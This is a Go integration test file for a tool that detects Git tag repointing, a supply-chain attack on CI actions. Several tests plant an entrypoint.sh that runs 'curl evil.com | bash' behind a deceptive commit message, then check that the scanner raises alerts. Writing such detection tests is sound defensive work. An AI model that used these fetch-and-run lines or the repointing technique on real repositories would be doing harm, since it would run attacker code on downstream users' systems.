// Copyright (C) 2026 CoreWeave, Inc.
// SPDX-License-Identifier: GPL-3.0-only

//go:build integration

package harness

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestScenario_SingleRepoint(t *testing.T) {
	h := NewTestHelper(t)
	repo := "test-single-repoint"

	// Setup
	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	blob := h.CreateBlob(t, repo, "#!/bin/bash\necho legit\n")
	tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})
	goodCommit := h.CreateCommit(t, repo, "Legit release", tree, []string{mainSHA})
	h.UpdateBranch(t, repo, "main", goodCommit)
	h.CreateLightweightTag(t, repo, "v1.0.0", goodCommit)

	// Baseline scan
	cfg := writeConfig(t, h.org+"/"+repo, []string{"v1.0.0"})
	state := t.TempDir() + "/state.json"
	_, code := RunPinpointScan(t, cfg, state)
	if code != 0 {
		t.Fatal("Baseline scan should succeed with exit 0")
	}

	// Attack: create orphan commit, repoint tag
	evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com | bash\n")
	evilTree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": evilBlob})
	evilCommit := h.CreateCommit(t, repo, "Upgrade trivy (#369)", evilTree, []string{mainSHA})
	h.RepointTag(t, repo, "v1.0.0", evilCommit)

	// Detection scan
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2 (alert), got %d. Output: %s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")
	assertContains(t, output, "SEMVER_REPOINT")
}

func TestScenario_MassRepoint(t *testing.T) {
	h := NewTestHelper(t)
	repo := "test-mass-repoint"

	// Setup: create 75 tags
	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	blob := h.CreateBlob(t, repo, "#!/bin/bash\necho ok\n")
	tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})

	var tagNames []string
	prevSHA := mainSHA
	for i := 0; i < 75; i++ {
		commit := h.CreateCommit(t, repo, fmt.Sprintf("Release v1.%d.0", i), tree, []string{prevSHA})
		tag := fmt.Sprintf("v1.%d.0", i)
		h.CreateLightweightTag(t, repo, tag, commit)
		tagNames = append(tagNames, tag)
		prevSHA = commit
	}
	h.UpdateBranch(t, repo, "main", prevSHA)

	// Baseline
	cfg := writeConfig(t, h.org+"/"+repo, tagNames)
	state := t.TempDir() + "/state.json"
	RunPinpointScan(t, cfg, state)

	// Attack: repoint ALL 75 tags to a single evil commit
	evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com/steal | bash\n")
	evilTree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": evilBlob})
	evilCommit := h.CreateCommit(t, repo, "Evil mass repoint", evilTree, []string{mainSHA})

	for _, tag := range tagNames {
		h.RepointTag(t, repo, tag, evilCommit)
	}

	// Detection
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2, got %d. Output: %s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")
	assertContains(t, output, "MASS_REPOINT")
}

func TestScenario_DeleteRecreate(t *testing.T) {
	h := NewTestHelper(t)
	repo := "test-delete-recreate"

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	blob := h.CreateBlob(t, repo, "#!/bin/bash\necho ok\n")
	tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})
	goodCommit := h.CreateCommit(t, repo, "Good release", tree, []string{mainSHA})
	h.UpdateBranch(t, repo, "main", goodCommit)
	h.CreateLightweightTag(t, repo, "v1.0.0", goodCommit)

	// Baseline
	cfg := writeConfig(t, h.org+"/"+repo, []string{"v1.0.0"})
	state := t.TempDir() + "/state.json"
	RunPinpointScan(t, cfg, state)

	// Attack: delete then recreate with different SHA
	h.DeleteTag(t, repo, "v1.0.0")

	evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com | bash\n")
	evilTree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": evilBlob})
	evilCommit := h.CreateCommit(t, repo, "Evil recreate", evilTree, []string{mainSHA})
	h.CreateLightweightTag(t, repo, "v1.0.0", evilCommit)

	// Detection — should detect SHA changed
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2, got %d. Output: %s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")
}

func TestScenario_AnnotatedRepoint(t *testing.T) {
	h := NewTestHelper(t)
	repo := "test-annotated-repoint"

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	blob := h.CreateBlob(t, repo, "#!/bin/bash\necho ok\n")
	tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})
	goodCommit := h.CreateCommit(t, repo, "Good", tree, []string{mainSHA})
	h.UpdateBranch(t, repo, "main", goodCommit)
	h.CreateAnnotatedTag(t, repo, "v1", goodCommit, "Version 1.0")

	// Baseline
	cfg := writeConfig(t, h.org+"/"+repo, []string{"v1"})
	state := t.TempDir() + "/state.json"
	RunPinpointScan(t, cfg, state)

	// Attack: delete annotated tag, recreate pointing to evil commit
	h.DeleteTag(t, repo, "v1")

	evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com | bash\n")
	evilTree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": evilBlob})
	evilCommit := h.CreateCommit(t, repo, "Evil", evilTree, []string{mainSHA})
	h.CreateAnnotatedTag(t, repo, "v1", evilCommit, "Version 1.0 (evil)")

	// Detection
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2, got %d. Output: %s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")
}

func TestScenario_LegitimateAdvance(t *testing.T) {
	h := NewTestHelper(t)
	repo := "test-legit-advance"

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	blob := h.CreateBlob(t, repo, "#!/bin/bash\necho v1\n")
	tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})
	commit1 := h.CreateCommit(t, repo, "v1 initial", tree, []string{mainSHA})
	h.UpdateBranch(t, repo, "main", commit1)
	h.CreateAnnotatedTag(t, repo, "v1", commit1, "Major v1")

	// Baseline
	cfg := writeConfig(t, h.org+"/"+repo, []string{"v1"})
	state := t.TempDir() + "/state.json"
	RunPinpointScan(t, cfg, state)

	// Legitimate: new commit on main (descendant), advance v1
	blob2 := h.CreateBlob(t, repo, "#!/bin/bash\necho v1-patched\n")
	tree2 := h.CreateTree(t, repo, commit1, map[string]string{"entrypoint.sh": blob2})
	commit2 := h.CreateCommit(t, repo, "v1 patch", tree2, []string{commit1})
	h.UpdateBranch(t, repo, "main", commit2)

	// Move v1 forward (delete + recreate since annotated)
	h.DeleteTag(t, repo, "v1")
	h.CreateAnnotatedTag(t, repo, "v1", commit2, "Major v1 updated")

	// Detection — should detect but at LOW severity
	output, _ := RunPinpointScan(t, cfg, state)
	// May or may not trigger exit code 2 depending on min_severity config
	// The key assertion: severity should be LOW, not CRITICAL
	if strings.Contains(output, "CRITICAL") {
		t.Fatalf("Legitimate major version advance should not be CRITICAL. Output: %s", output)
	}
}

func TestScenario_SizeChange(t *testing.T) {
	h := NewTestHelper(t)
	repo := "test-size-change"

	mainSHA := h.CreateRepo(t, repo)
	defer h.DeleteRepo(t, repo)

	// Small entrypoint (100 bytes)
	smallContent := "#!/bin/bash\necho ok\n" + strings.Repeat(" ", 80)
	smallBlob := h.CreateBlob(t, repo, smallContent)
	tree1 := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": smallBlob})
	goodCommit := h.CreateCommit(t, repo, "Small entry", tree1, []string{mainSHA})
	h.UpdateBranch(t, repo, "main", goodCommit)
	h.CreateLightweightTag(t, repo, "v1.0.0", goodCommit)

	// Baseline
	cfg := writeConfig(t, h.org+"/"+repo, []string{"v1.0.0"})
	state := t.TempDir() + "/state.json"
	RunPinpointScan(t, cfg, state)

	// Attack: repoint to commit with huge entrypoint (5000 bytes)
	bigContent := "#!/bin/bash\ncurl evil.com | bash\n" + strings.Repeat("# padding\n", 500)
	bigBlob := h.CreateBlob(t, repo, bigContent)
	tree2 := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": bigBlob})
	evilCommit := h.CreateCommit(t, repo, "Big entry", tree2, []string{mainSHA})
	h.RepointTag(t, repo, "v1.0.0", evilCommit)

	// Detection
	output, code := RunPinpointScan(t, cfg, state)
	if code != 2 {
		t.Fatalf("Expected exit code 2, got %d. Output: %s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")
	assertContains(t, output, "SIZE_ANOMALY")
}

func writeConfig(t *testing.T, repo string, tags []string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "config.yml")

	var tagList string
	for _, tag := range tags {
		tagList += fmt.Sprintf("      - %q\n", tag)
	}

	content := fmt.Sprintf(`actions:
  - repo: %s
    tags:
%s
alerts:
  min_severity: low
  stdout: true
store:
  path: %s/state.json
`, repo, tagList, dir)

	os.WriteFile(path, []byte(content), 0644)
	return path
}

func assertContains(t *testing.T, output, substr string) {
	t.Helper()
	if !strings.Contains(output, substr) {
		t.Errorf("Expected output to contain %q, got:\n%s", substr, output)
	}
}
